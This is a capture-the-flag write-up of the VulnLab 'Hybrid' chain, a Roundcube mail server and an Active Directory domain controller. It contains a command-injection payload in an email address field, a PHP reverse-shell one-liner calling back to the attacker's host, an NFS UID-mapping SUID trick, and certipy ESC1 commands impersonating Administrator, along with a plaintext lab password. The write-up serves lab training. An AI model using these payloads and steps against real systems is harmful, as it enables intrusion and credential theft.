Title: Hybrid
Slug: ctf/vulnlab/chains/hybrid
Date: 2025-04-09 18:00
Category: CTF

Hybrid is an easy VulnLab chain.

<iframe width="536" height="620" src="https://api.vulnlab.com/api/v1/share?id=3120196c-f4ff-4cf5-82ee-a624130a1d68"/>


Target is:

- 10.10.246.197
- 10.10.246.198
## Enumeration

~~~shell
sudo nmap -sC -sV -iL targets.txt -oN nmap.txt
~~~

~~~
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-05 11:00 CEST
Nmap scan report for 10.10.246.197
Host is up (0.030s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-05 09:00:38Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.hybrid.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.hybrid.vl
| Not valid before: 2024-07-17T16:39:23
|_Not valid after:  2025-07-1w7T16:39:23
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.hybrid.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.hybrid.vl
| Not valid before: 2024-07-17T16:39:23
|_Not valid after:  2025-07-17T16:39:23
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.hybrid.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.hybrid.vl
| Not valid before: 2024-07-17T16:39:23
|_Not valid after:  2025-07-17T16:39:23
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.hybrid.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.hybrid.vl
| Not valid before: 2024-07-17T16:39:23
|_Not valid after:  2025-07-17T16:39:23
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HYBRID
|   NetBIOS_Domain_Name: HYBRID
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: hybrid.vl
|   DNS_Computer_Name: dc01.hybrid.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-04-05T09:01:17+00:00
|_ssl-date: 2025-04-05T09:01:58+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=dc01.hybrid.vl
| Not valid before: 2025-04-04T08:59:43
|_Not valid after:  2025-10-04T08:59:43
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -2s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-04-05T09:01:18
|_  start_date: N/A

Nmap scan report for 10.10.246.198
Host is up (0.030s latency).
Not shown: 990 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:bc:22:26:78:3c:b4:e0:6b:ea:aa:1e:c1:62:5d:de (ECDSA)
|_  256 a3:b5:d8:61:06:e6:3a:41:88:45:e3:52:03:d2:23:1b (ED25519)
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
80/tcp   open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Redirecting...
110/tcp  open  pop3     Dovecot pop3d
|_pop3-capabilities: RESP-CODES STLS CAPA PIPELINING TOP UIDL AUTH-RESP-CODE SASL
| ssl-cert: Subject: commonName=mail01
| Subject Alternative Name: DNS:mail01
| Not valid before: 2023-06-17T13:20:17
|_Not valid after:  2033-06-14T13:20:17
|_ssl-date: TLS randomness does not represent time
111/tcp  open  rpcbind  2-4 (RPC #100000)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
143/tcp  open  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: capabilities Pre-login more LOGINDISABLEDA0001 LOGIN-REFERRALS IMAP4rev1 post-login OK listed have ID STARTTLS SASL-IR LITERAL+ IDLE ENABLE
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mail01
| Subject Alternative Name: DNS:mail01
| Not valid before: 2023-06-17T13:20:17
|_Not valid after:  2033-06-14T13:20:17
587/tcp  open  smtp     Postfix smtpd
|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=mail01
| Subject Alternative Name: DNS:mail01
| Not valid before: 2023-06-17T13:20:17
|_Not valid after:  2033-06-14T13:20:17
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: capabilities Pre-login more LOGIN-REFERRALS post-login IDLE listed OK AUTH=LOGINA0001 have ID ENABLE SASL-IR LITERAL+ AUTH=PLAIN IMAP4rev1
995/tcp  open  ssl/pop3 Dovecot pop3d
| ssl-cert: Subject: commonName=mail01
| Subject Alternative Name: DNS:mail01
| Not valid before: 2023-06-17T13:20:17
|_Not valid after:  2033-06-14T13:20:17
|_pop3-capabilities: RESP-CODES USER CAPA PIPELINING TOP UIDL AUTH-RESP-CODE SASL(PLAIN LOGIN)
|_ssl-date: TLS randomness does not represent time
2049/tcp open  nfs      3-4 (RPC #100003)
Service Info: Host:  mail01.hybrid.vl; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 2 IP addresses (2 hosts up) scanned in 134.29 seconds
~~~


Host `10.10.246.197` - `DC01.hybrid.vl` appears to be a DC whilst `10.10.246.198` - `mail01.hybrid.vl` is a mail server, hosting RoundCube on port 80:


![[mail01-roundcube.png]]

Having no credentials, further enumeration is performed. Host `mail01` has a NFS service running that for some reason nmap couldn't properly enumerate on the first run; a more specific NFS enumeration is performed as follows:

~~~shell
nmap -p 111,2049 --script="nfs-*" 10.10.246.1988
~~~

![[mail01-nfs-nmap.png]]

## mail01.hybrid.vl

### Foothold

The remote share `/opt/share` is accessible and mountable with read and write permissions. It's then mounted as follows:

~~~shell
mkdir shared
sudo mount -o nolock 10.10.246.198:/opt/share shared
~~~

![[mail01-nfs-mount.png]]

Copy the archive `backup.tar.gz`  from the remote share and extract its content: 

~~~shell
cp shared/backup.tar.gz ./
tar -xvzf backup.tar.gz
~~~

![[mail01-backup-archive.png]]

The backup contains the `dovecot-users` file containing some credentials:

~~~
cat etc/dovecot/dovecot-users
~~~

![[mail01-dovecot-users.png]]

Using these credentials it's possible to access to RoundCube, for example, as `peter.turner@hybrid.vl`. In the inbox, a mail from `admin@hybrid.vl` is present; this mail states that a junk filter plugin has been installed:

![[mail01-roundcube-access.png]]

After some little searching, the junk filter plugin `markasjunk` is known to be vulnerable to RCE, as explained [here](https://ssd-disclosure.com/ssd-advisory-roundcube-markasjunk-rce/). To confirm that this plugin it's actually installed, the following request is performed:

~~~shell
curl http://mail01.hybrid.vl/plugins/markasjunk/config.inc.php
~~~

![[mail01-junk-plugin-confirmation.png]]

The server responds `200 OK`, confirming that the plugin it's installed.

In order to abuse the RCE vulnerability, it's first necessary to edit current user's mail as follows: `peter.turner&<command to execute>&@hybryd.vl`.

Since it's not possible to use spaces (the mail would be invalid), the `${IFS}` environment variable can be used in place.

The following payload it's used to run the shell command `sh /opt/share/revshell.sh`:

- `peter.turner&sh${IFS}/opt/share/revshell.sh&@hybrid.vl`

![[mail01-rce-payload.png]]

Where `revshell.sh` is a shell script previously copied to the mounted share. It contains the following reverse shell:

~~~shell
php -r '$sock=fsockopen("10.8.6.6",8090);exec("sh <&3 >&3 2>&3");'
~~~

In order to trigger the exploit, it's necessary to mark as junk a mail having as sender the previous payload. A mail is sent as follows:

![[mail01-send-mail.png]]

Then, the mail is marked as junk, triggering the reverse shell:

![[mail01-mark-as-junk.png]]

![[mail01-reverse-shell.png]]

Current user `www-data` has no particular privileges and cannot access to domain user  `peter.turner@hybrid.vl` home folder on the machine which could contain some interesting information.

Root squashing it's not disabled so it's not possible to abuse NFS to escalate to root privileges. 

![[mail01-nfs-exports.png]]

However, it's stil possible to use it to obtain `peter.turner@hybrid.vl` privileges. get this users's uid as follows:

~~~shell
id peter.turner@hybrid.vl
~~~

![[mail01-peterturner-uid.png]]

On the attacker machine, try adding a user with the UID `902601108`:

~~~shell
sudo useradd -u 902601108 -M tmpuser
~~~

![[mail01-useradd-uid-fail.png]]

UID `902601108` is outside allowed limits; edit `/etc/logins.defs` to set an higher upper limit:

~~~shell
sudo vim /etc/login.defs
~~~

![[mail01-uid-max.png]]

Re-run previous command to create a user with the specified UID.

After copying the `bash` binary from the remote machine to the attacker machine (attacker's `bash` binary misses some dynamic libraries on the remote machine), copy this binary (renamed to `tmpbash`) into the mounted share using created user `tmpuser` and add SUID privileges:

~~~shell
sudo su tmpuser -c "cp ../tmpbash ./"
~~~

![[mail01-suid-bash.png]]

On the remote machine, `tmpuser`'s UID `902601108` will be mapped to `peter.turner@hybrid.vl`. Running `tmpbash` with the `-p` will open a shell as the SUID user:

![[mail01-nfs-uid-mapping.png]]

### Credentials Gathering

`peter.turner@hybrid.vl` home contains the flag and a kdb password store:

![[mail01-peterturner-home.png]]

Using the same password as for RoundCube, the domain account password for `peter.turner@hybrid.vl` is found:

![[mail01-kdb.png]]

Moreover, `peter.turner@hybrid.vl` has unrestricted sudo privileges on `mail01.hybrid.vl`:

![[mail01-peterturner-sudo.png]]

## DC01.hybrid.vl

### ADCS enumeration

Found credentials are then used to enumerate the domain. Bloodhound's python collection is used as follows:

~~~shell
bloodhound-python --zip -dc DC01.hybrid.vl -u 'peter.turner' -p 'b0cwR+G4Dzl_rw' -d 'hybrid.vl' -ns 127.0.0.1
~~~

![[dc01-bloodhound-enum.png]]

Basic enumeration leads to nothing; certipy-ad is then used to enumerate CAs and ADCS services:

~~~shell
certipy-ad find -dc-ip 10.10.246.197 -u peter.turner@hybrid.vl -p b0cwR+G4Dzl_rw -json -old-bloodhound
~~~

![[dc01-certipy-enum.png]]
In the output stands out the certificate template `HybridComputers` that can be abused to escalate privileges and impersonate any user on the domain (**ESC1**):

![[dc01-esc1-certificate-template.png]]

A clearer view it's provided by bloodhound: "Domain Computers" group can enroll this template:

![[dc01-hybridcomputers-bloodhound.png]]

### Privilege Escalation

Using `peter.turner@hybrid.vl` sudo privileges on `mail01`, it's possible to dump a cached machine ticket stored in `/var/lib/sss/db`: 

![[dc01-mail01-ccache.png]]

This ticket can then be used to request a certificate impersonating `Administrator` user with the template `HybridComputers`, authenticating as `mail01`:

~~~shell
export KRB5CCNAME=ccache_HYBRID.VL

ertipy-ad req -u "MAIL01$" -k -ca "hybrid-DC01-CA" -target 'DC01.hybrid.vl' -template 'HybridComputers' -upn "Administrator@hybrid.vl" -dns 'dc0.hybrid.vl' -key-size 4096 
~~~

![[dc01-esc1-exploit.png]]
Use then the certificate to authenticate to the DC as `Administrator`:

~~~shell
certipy-ad auth -pf administrator_dc0.pfx -dc-ip 10.10.246.197
~~~

![[dc01-administrator-auth.png]]

Please note that requesting the certificate without specifying the`dNSHostName` with the `-dns` option as follows:

~~~shell
certipy-ad req -u "MAIL01$" -k -ca "hybrid-DC01-CA" -target 'DC01.hybrid.vl' -template 'HybridComputers' -upn "Administrator@hybrid.vl" -key-size 4096 
~~~

![[dc01-failed-certificate-request.png]]

will generate the error `KDC_ERROR_CLIENT_NOT_TRUSTED(Reserved for PKINIT)` since machines accounts do not have the `UPN` attribute but the `dNSHostName` attribute.

Access to `DC01` as `Administrator` and get the flag:

![[dc01-administrator-flag.png]]